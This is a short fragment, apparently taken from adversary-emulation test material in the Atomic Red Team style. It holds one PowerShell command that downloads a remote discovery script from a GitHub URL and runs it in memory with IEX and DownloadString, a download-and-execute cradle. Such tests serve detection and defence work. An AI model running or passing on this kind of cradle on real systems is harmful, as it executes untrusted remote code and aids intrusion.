...
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')"
